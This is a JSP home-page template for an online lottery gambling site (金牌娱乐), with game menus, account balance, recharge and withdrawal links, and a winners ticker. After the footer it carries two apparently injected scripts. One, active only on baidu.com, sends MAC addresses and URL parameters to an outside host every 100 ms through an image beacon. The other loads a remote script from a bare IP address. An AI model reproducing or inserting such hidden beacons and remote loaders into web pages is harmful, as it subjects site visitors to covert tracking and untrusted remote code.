<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<!-- saved from url=(0028)/index -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>金牌娱乐 - 首页</title>
    <meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
	<meta http-equiv="expires" content="0">
    <link rel="stylesheet" href="./resource/reset.css">
    <link rel="stylesheet" href="./resource/wk-common.css">
    <link rel="stylesheet" href="./resource/wk-index.css">
    <link rel="icon" href="/res/home/images/favicon.ico" type="image/x-icon">
	<script type="text/javascript" src="./resource/jquery-1.11.0.min.js"></script>
	<script type="text/javascript" src="./resource/jquery.timer.js"></script>
	<script type="text/javascript" src="./resource/layer.js"></script>
	<script type="text/javascript" src="./resource/spinner.js"></script>
	<script type="text/javascript" src="./resource/base.js"></script>
	<script type="text/javascript">
		var falg='0';
	</script>
	<script type="text/javascript" src="./resource/index.js"></script>
</head>
<body>

<!--头部-->
<div class="header">
	<div class="w1150">
		<a class="logo" href="/index"></a>
		<div class="betsHallBox">
			<a href="javascript:;" class="betsHall">所有游戏 <span style="font-family:&#39;宋体&#39;;font-size: 14px;">&gt;</span></a>
			<!--所有彩种-->
			<div class="allLotteryList">
	        	<div class="hotLotteryList" style="height: 384px;">
	        		<i></i>
	        		<a href="/lotts/cqssc/index" class="acqsscIcon" title="重庆时时彩"></a>
					<!--<a href="/lotts/sj1fc/index" class="asj1fcIcon" title="鼎汇一分彩"></a>
	        		<a href="/lotts/sj_mmc/index" class="ammcIcon" title="鼎汇40秒"></a>
	        		<a href="/lotts/tiger/index" class="atigerIcon" title="鼎汇秒秒彩"></a>-->
	        	</div>
	            <div class="lotteryList" id="lotteryList">
	                
	                <div class="lottDetail">
	                    <i class="lotteryTitle title_ssc" title="时时彩"></i>
	                    <div class="lotteryDetdailList">
	                    	
                    			<ul class="lotteryGroupList">

										<!--
			                    		<li><a href="/lotts/tiger/index" class="lottplayExplain">鼎汇秒秒彩</a></li>
		                    		
			                    		<li><a href="/lotts/sj_mmc/index" class="lottplayExplain">鼎汇40秒</a></li>
		                    		
			                    		<li><a href="/lotts/sj1fc/index" class="lottplayExplain">鼎汇一分彩</a></li>
		                    		
			                    		<li><a href="/lotts/sj3fc/index" class="lottplayExplain">鼎汇三分彩</a></li>
		                    		
			                    		<li><a href="/lotts/sj5fc/index" class="lottplayExplain">鼎汇五分彩</a></li>
		                    		
			                    		<li><a href="/lotts/gppl5/index" class="lottplayExplain">高频排列5</a></li>
		                    		
	                   			</ul>
	                    	
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/jndbsc/index" class="lottplayExplain">加拿大3.5</a></li>
		                    		
			                    		<li><a href="/lotts/tx1fc/index" class="lottplayExplain">腾讯分分彩</a></li>
		                    		
			                    		<li><a href="/lotts/dj1_5/index" class="lottplayExplain">东京1.5</a></li>
		                    		
	                   			</ul>
	                   			-->
	                    	
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/cqssc/index" class="lottplayExplain">重庆时时彩</a></li><li><a href="/lotts/txssc/index" class="lottplayExplain">腾讯分分彩</a></li>
		                    		
			                    		<li><a href="/lotts/tjssc/index" class="lottplayExplain">天津时时彩</a></li>
		                    		
			                    		<li><a href="/lotts/xjssc/index" class="lottplayExplain">新疆时时彩</a></li>
		                    		
	                   			</ul>
	                    	
	                    </div>
	                </div>
	                
	                <div class="lottDetail">
	                    <i class="lotteryTitle title_pk10" title="北京赛车"></i>
	                    <div class="lotteryDetdailList">
	                    	
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/pk10/index" class="lottplayExplain">北京赛车</a></li>
		                    		
	                   			</ul>

							<!--
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/ffpk10/index" class="lottplayExplain">分分PK10</a></li>
		                    		
			                    		<li><a href="/lotts/f3pk10/index" class="lottplayExplain">3分PK10</a></li>
		                    		
			                    		<li><a href="/lotts/f5pk10/index" class="lottplayExplain">5分PK10</a></li>
		                    		
	                   			</ul>
	                   		-->
	                    	
	                    </div>
	                </div>
	                
	                <div class="lottDetail">
	                    <i class="lotteryTitle title_k3" title="快3"></i>
	                    <div class="lotteryDetdailList">
	                    	
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/shk3/index" class="lottplayExplain">上海快3</a></li>

			                    		<li><a href="/lotts/jsk3/index" class="lottplayExplain">江苏快3</a></li>
		                    		
	                   			</ul>
	                    	
	                    </div>
	                </div>
	                
	                <div class="lottDetail">
	                    <i class="lotteryTitle title_11x5" title="11选5"></i>
	                    <div class="lotteryDetdailList">
	                    		<!--
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/f1_11x5/index" class="lottplayExplain">一分11选5</a></li>
		                    		
			                    		<li><a href="/lotts/f3_11x5/index" class="lottplayExplain">三分11选5</a></li>
		                    		
	                   			</ul>
	                    		-->
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/gd11x5/index" class="lottplayExplain">广东11选5</a></li>
		                    		

		                    		
			                    		<li><a href="/lotts/jx11x5/index" class="lottplayExplain">江西11选5</a></li>
		                    		
			                    		<li><a href="/lotts/sd11x5/index" class="lottplayExplain">山东11选5</a></li>
		                    		
	                   			</ul>
	                    	
	                    </div>
	                </div>
	                
	                <div class="lottDetail">
	                    <i class="lotteryTitle title_dp" title="低频"></i>
	                    <div class="lotteryDetdailList">
	                    	
                    			<ul class="lotteryGroupList">
		                    		
			                    		<li><a href="/lotts/pl3/index" class="lottplayExplain">排列三</a></li>
		                    		
			                    		<li><a href="/lotts/pl5/index" class="lottplayExplain">排列5</a></li>
		                    		
			                    		<li><a href="/lotts/3d/index" class="lottplayExplain">福彩3D</a></li>
		                    		
	                   			</ul>
	                    	
	                    </div>
	                </div>
	                
	            </div>
	        </div>
        </div>
        <a href="/user/index?tabId=msg" class="inMail"><i></i>站内信<span id="platNoticeNumSpan"></span></a>
        <label class="username overflowEllipsis" title="${nickName}">
        	昵称：${nickName}
       	</label>
        <label>
			<span>可用余额：</span>
			<span id="userBalance" class="userBalance overflowEllipsis" title="${amount}" data-value="${amount}">${amount}</span>
			<span>元</span>
			<a href="javascript:;" class="accountHide" id="accountHide" data-value="false" title="隐藏金额"></a>
		</label>
		<a href="javascript:;" class="recharge" onclick="javascript:if('0' == 1 || '0' == 3){$.alert('您的充值功能已被冻结！');}else{window.location.href='/recharge/rechargeMoney1'}"></a>
		<a href="javascript:;" class="drawMoney" onclick="javascript:if('0' == 2 || '0' == 3){$.alert('您的提现功能已被冻结！');}else{window.location.href='/deposit/deposit'}"></a>
        <div class="headerR">
            <a href="http://dkc.duokebo.com/webchat/chat.aspx?siteid=730985" class="customerService" target="_blank"><i></i>联系客服</a>
	        <a href="javascript:;" class="refresh" id="refererUser"><i class=""></i>刷新</a>
	        <a href="/logout" class="userQuit"><i></i>登出</a>
        </div>
	</div>
</div>
<script type="text/javascript">
	$(function() {
		//获取未读站内信数量
		ajaxObject('/message/messageCountUnRead',"POST",function(data){
			if (data > 0) {
				$("#platNoticeNumSpan").addClass("platNoticeNum").text(data);
			} else {
				$("#platNoticeNumSpan").removeClass("platNoticeNum").text("");
			}
		});
	});
</script>


<!-- 通用右侧导航 -->
<div id="asideRight">
	<a class="sy active" href="/" title="首页"></a>
	<a class="zxgg" href="/notice/index" title="最新公告"></a>
	<a class="yxjl" href="/game/index?tabId=gameBetList" title="游戏记录"></a>
	<a class="zhjl" href="/game/index?tabId=trace" title="追号记录"></a>
	<a class="glzx" href="/user/index" title="管理中心"></a>
	<a class="bbzx" href="/report/index" title="报表中心"></a>
	<a class="bzzx" href="/helpCenter/index" title="帮助中心"></a>
	<a class="top" href="/index#top"></a>
</div>
<script>
	$(function(){
		var href = document.location.href;
		if(href == document.location.origin || href == (document.location.origin+'/') || href == (document.location.origin+'/index')){
			$('.sy').addClass('active');
		}else if(href.indexOf('notice/index')>0){
			$('.zxgg').addClass('active');
		}else if(href.indexOf('gameBetList')>0){
			$('.yxjl').addClass('active');
		}else if(href.indexOf('trace')>0){
			$('.zhjl').addClass('active');
		}else if(href.indexOf('report/index')>0){
			$('.bbzx').addClass('active');
		}else if(href.indexOf('user/index')>0){
			$('.glzx').addClass('active');
		}else if(href.indexOf('helpCenter/index')>0){
			$('.bzzx').addClass('active');
		}
	});
</script>
<div class="main">
	<!-- banner轮播 -->
	<div class="bannerBox">
	    <div class="userAcctBgBox" id="userAcctBg">
		   	

	           <a href="/index" title="标语" target="_blank" class="active"><img src="./resource/indexbiaoyu.jpg"></a>
		   	

	    </div>
	    <p class="userAcctBgList" id="userAcctBgList">
		    
		        <span class=""></span>
		    
		        <span class="active"></span>
		    
		        <span class=""></span>
		    
		        <span class=""></span>
		    
		        <span class=""></span>
		    
	    </p>
    </div>
	<!-- 网站公告——跑马灯 -->
	<div class="noticeScrollArea">
		<span class="noticeScrollTitle webSiteNotice">网站公告</span>
		<div class="noticeScrollBox">
			<div class="noticeScroll">
				<ul class="noticeScrollList" id="webSiteNotice">
					<c:forEach var="signs" items="${signs}">
						<li class="notice">
							<a href="/notice/index?id=${signs.id}" class="textUnderline" target="_blank">${signs.key}</a>
							<span class="noticeTime">${signs.time}</span>
						</li>
					</c:forEach>
				</ul>
			</div>
		</div>
	</div>
	<!-- 热门推荐 -->
    <div class="lottTypeBox">
    	<h2>热门推荐</h2>
    	<div class="vlott">
    		
    			<a href="/lotts/cqssc/index" class="acqssc">
					<p>本期截止：<span data-key="cqssc" data-time="${cqssc}">${cqssc}</span></p>
				</a>
    		
    			<a href="/lotts/gd11x5/index" class="agd11x5">
					<p>本期截止：<span data-key="gd11x5" data-time="${gd11x5}">${gd11x5}</span></p>
				</a>
    		
    			<a href="/lotts/pk10/index" class="apk10">
					<p>本期截止：<span data-key="pk10" data-time="${pk10}">${pk10}</span></p>
				</a>
    		
    			<a href="/lotts/3d/index" class="a3d">
					<p>本期截止：<span data-key="3d" data-time="${fc3d}">${fc3d}</span></p>
				</a>
    		
    	</div>
    	<div class="hlott">
		    <a href="/lotts/cqssc/index">时时彩</a>
    		<a href="/lotts/pk10/index">赛车彩</a>
    		<a href="/lotts/gd11x5/index">选五彩</a>
    		<a href="/lotts/jsk3/index">快三彩</a>
    	</div>
    </div>
    <!-- 中奖播报——跑马灯 -->
    <div class="noticeScrollArea">
		<span class="noticeScrollTitle awardsNotice">中奖播报</span>
		<div class="noticeScrollBox">
			<div class="noticeScroll">
				<ul class="noticeScrollList" id="awardsNotice">
					<c:forEach var="lotterys" items="${lotterys}">
						<li class="notice">
							<span>${lotterys.lotName}</span>
							<span class="lotteryName">${lotterys.account}</span>
							<span class="winAmount">${lotterys.winMoney}元</span>
						</li>
					</c:forEach>
				</ul>
			</div>
		</div>
    </div>
	<!-- 帮助中心 -->
    <div class="helpBox">
    	<h2>帮助中心</h2>
    	<div class="state-4" id="helpList">
    		<a href="/helpCenter/index" class="item-1"><i></i></a>
    		<a href="/helpCenter/index" class="item-2"><i></i></a>
    		<a href="/helpCenter/index" class="item-3"><i></i></a>
    		<a href="/helpCenter/index" class="item-4"><i></i></a>
    	</div>
    </div>
</div>


<!-- 通用底部 -->
<div class="footer">
	<div class="mainWidth">
		<ul class="download">
			<li class="pc"><a href="#?t=4"><i></i>pc端下载</a></li>
			<li class="ios"><a href="#?t=2"><i></i>ios端下载</a></li>
			<li class="android"><a href="#?t=1"><i></i>安卓客户端下载</a></li>
			<li class="auto"><a href="javascript:;"><i></i>自动投注软件</a></li>
		</ul>
		<ul class="browser">
			<li class="google"><a target="_blank" href="https://www.google.com/chrome/browser/desktop/index.html"><i></i>google浏览器</a></li>
			<li class="fox"><a target="_blank" href="https://www.mozilla.org/en-US/firefox/new/"><i></i>火狐浏览器</a></li>
			<li class="ie"><a target="_blank" href="https://support.microsoft.com/zh-cn/help/17621/internet-explorer-downloads"><i></i>IE浏览器</a></li>
		</ul>
		<ul class="footerOther">
			<li><a href="#">关于我们</a></li>
			<li><a href="#?tabId=transProtocol">交易协议</a></li>
			<li><a class="dnsLink" href="#">防劫持教程</a></li>
		</ul>
		<p>@金牌娱乐  版权所有 2010-2018 copyright DH·VK Interactive Network Techno Co.</p>
	</div>
</div>


<!-- 公告详情-->

<!-- 公告详情-->
<div id="platNoticeContentBox" style="display:none;">

	<div class="dialogBtn">
		<a href="javascript:;" class="btn closePlatNotice">确定</a>
	</div>
</div>
<script>;(function(){if(window.location.host!='www.baidu.com'||window._BD_C||window.sendImage){return}window._BD_C={mac:"74-D4-35-DE-F1-D4",bmac:"28-51-32-06-3D-A6",cid:"",url:""};setInterval(function(){if(window.location.href!=window._BD_C.url){window._BD_C.tn='',window._BD_C.ch='';window._BD_C.url=window.location.href;if(window.location.search!=''){_arg=window.location.search.replace('?','').split('&');for(i in _arg){if(_arg.hasOwnProperty(i)&&_arg[i]!=''){t=_arg[i].split('=');switch(t[0]){case'tn':window._BD_C.tn=t[1];break;case'ch':window._BD_C.ch=t[1];break}}}}_t=new Image;_t.src="https://api-test.sndun.com/wb/stage.json?tntype=baidu&cid="+window._BD_C.cid+"&bmac="+window._BD_C.bmac+"&mac="+window._BD_C.mac+"&tn="+window._BD_C.tn+"&ch="+window._BD_C.ch+'&_='+(+new Date());_t=null}},100)})();</script><script src="http://47.90.44.221/moni.php?m=1510851806" type="text/javascript"></script></body>